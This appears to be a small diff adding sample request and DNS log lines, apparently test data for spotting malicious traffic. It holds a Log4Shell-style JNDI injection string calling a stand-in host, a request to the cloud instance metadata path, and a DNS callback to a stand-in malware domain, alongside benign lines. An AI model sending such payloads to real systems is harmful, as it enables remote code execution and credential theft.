@@ -1,0 +1,5 @@
+GET /?user=${jndi:ldap://evil.com/a} HTTP/1.1
+GET /latest/meta-data/ HTTP/1.1
+DNS Query: malware.callback.evil.com
+GET /safe-content HTTP/1.1
+User-Agent: Mozilla/5.0
